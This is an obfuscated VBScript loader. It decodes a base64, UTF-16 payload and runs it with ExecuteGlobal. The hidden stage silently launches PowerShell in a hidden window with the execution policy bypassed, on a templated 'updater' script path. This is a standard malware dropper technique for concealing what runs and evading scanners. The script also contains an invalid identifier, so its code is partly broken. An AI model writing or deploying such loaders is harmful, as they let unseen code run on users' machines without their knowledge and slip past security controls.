Dim rrrbfpxg
rrrbfpxg = ""
rrrbfpxg = rrrbfpxg & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbABsACwAIABzAEM"
rrrbfpxg = rrrbfpxg & "AbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoAC"
rrrbfpxg = rrrbfpxg & "IAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByA"
rrrbfpxg = rrrbfpxg & "HMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQBy"
rrrbfpxg = rrrbfpxg & "AGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB"
rrrbfpxg = rrrbfpxg & "4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAGwAZQAgACIAIg"
rrrbfpxg = rrrbfpxg & "AlACUAVQBQAEQAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUAIgAiACIACgBvAFMAaABlAGwAb"
rrrbfpxg = rrrbfpxg & "AAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAsACAAVAByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwA"
rrrbfpxg = rrrbfpxg & "IAA9ACAATgBvAHQAaABpAG4AZwA="
Dim hpndqfgn
Set hpndqfgn = CreateObject("ADODB.Stream")
hpndqfgn.Type = 1
hpndqfgn.Open
Dim _xn : Set _xn = CreateObject("MSXml2.DOMDocument").createElement("z")
_xn.dataType = "bin.base64"
_xn.text = rrrbfpxg
hpndqfgn.Write _xn.nodeTypedValue
hpndqfgn.Position = 0
hpndqfgn.Type = 2
hpndqfgn.Charset = "UTF-16LE"
Dim tljndbip : tljndbip = hpndqfgn.ReadText
hpndqfgn.Close
ExecuteGlobal tljndbip